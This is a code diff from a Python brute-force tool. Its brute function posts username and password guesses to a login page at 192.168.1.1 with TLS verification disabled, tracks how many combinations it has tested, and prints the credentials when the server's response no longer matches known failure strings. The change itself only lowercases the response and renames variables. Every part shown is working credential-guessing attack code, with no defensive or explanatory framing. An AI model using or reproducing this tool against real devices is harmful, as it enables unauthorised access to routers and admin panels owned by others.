@@ -15,26 +15,27 @@ def brute(username, password, combinations_tested, total_combinations):
         'Connection': 'keep-alive',
         'Cache-Control': 'max-age=0',
         'Upgrade-Insecure-Requests': '1',
-        'DNT': '1',  # Do Not Track
+        'DNT': '1',
         'Referer': 'http://192.168.1.1/',
         'Origin': 'http://192.168.1.1/',
     }
     try:
-        r = requests.post(url, data=data, headers=headers, verify=False)
+        a = requests.post(url, data=data, headers=headers, verify=False)
+        r_content = a.content.lower()
     except requests.exceptions.SSLError as e:
         print("Erro de SSL:", e)
         sys.exit(1)
     combinations_tested += 1
     sys.stdout.write("\rCombinations tested: {}/{}".format(combinations_tested, total_combinations))
     sys.stdout.flush()
-    if b"upgrade" in r.content or b"outdated" in r.content or b"browser" in r.content:
-        print("\nError:", r.content)
+    if b"upgrade" in r_content or b"outdated" in r_content or b"browser" in r_content:
+        print("\nError:", r_content)
         sys.exit()
-    if not any(item in r.content for item in expression):
+    if not any(item in r_content for item in expression):
         print("\nBrute Forcing...")
         print("[+] Username: ", username)
         print("[+] Password: ", password)
-        print("Server Response:", r.content)
+        print("Server Response:", r_content)
         sys.exit()
     return combinations_tested
 
